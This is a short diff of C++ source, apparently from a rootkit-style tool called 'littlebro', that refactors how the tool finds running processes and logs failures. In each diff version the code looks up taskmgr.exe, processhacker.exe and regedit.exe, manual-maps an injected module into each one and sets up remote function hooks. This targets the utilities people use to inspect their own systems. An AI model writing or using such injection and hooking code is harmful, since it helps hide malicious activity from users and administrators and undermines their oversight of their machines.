@@ -37,25 +37,20 @@ int main()
 
 	for (const auto& process_name : { "taskmgr.exe", "processhacker.exe", "regedit.exe"/*, "explorer.exe"*/ })
 	{
-		auto process_list = process::get_all_from_name(process_name);
+		auto process_list = get_all_processes(process_name);
 
 		if (process_list.empty()) // NO PROCESSES FOUND
+		{
+			logger::log_formatted("process not running or elevation insufficient", process_name);
 			continue;
+		}
 
 		// ENUMERATE ALL PROCESSES
-		for (auto id : process_list)
+		for (auto& proc : process_list)
 		{
 			logger::log_formatted("Target Process", process_name);
 
 			// MAP LITTLEBRO INTO TARGET PROCESS
-			auto proc = process(id, PROCESS_ALL_ACCESS);
-
-			if (!proc)
-			{
-				logger::log_error("Non-sufficient elevation, aborting");
-				continue;
-			}
-
 			const auto littlebro = injection::manualmap(proc).inject(littlebro_buffer);
 			auto hooks = remote_detours{ proc, littlebro };
 			// HOOK FUNCTIONS
